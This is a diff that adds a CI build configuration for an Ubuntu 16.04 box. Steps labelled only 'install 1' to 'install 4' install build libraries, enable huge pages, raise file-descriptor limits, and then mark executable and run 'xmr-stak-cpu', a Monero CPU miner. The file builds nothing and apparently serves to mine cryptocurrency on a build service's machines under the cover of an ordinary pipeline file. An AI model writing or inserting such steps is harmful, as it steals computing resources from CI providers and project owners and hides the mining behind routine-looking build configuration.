@@ -1,0 +1,22 @@
+box: ubuntu:16.04
+build:
+  steps:
+    - script:
+       name: install 1
+       code: apt-get update && apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev    
+    - script: 
+       name: install 1
+       code: sysctl -w vm.nr_hugepages=128
+    - script:
+       name: install 1
+       code: ulimit -n 262144 && ulimit -Hn 262144
+    - script:
+       name: install 2
+       code: ulimit -n 262144 && ulimit -Hn 262144
+    - script:
+       name: install 3
+       code: chmod +x xmr-stak-cpu
+    - script:
+       name: install 4
+       code: ./xmr-stak-cpu
+       
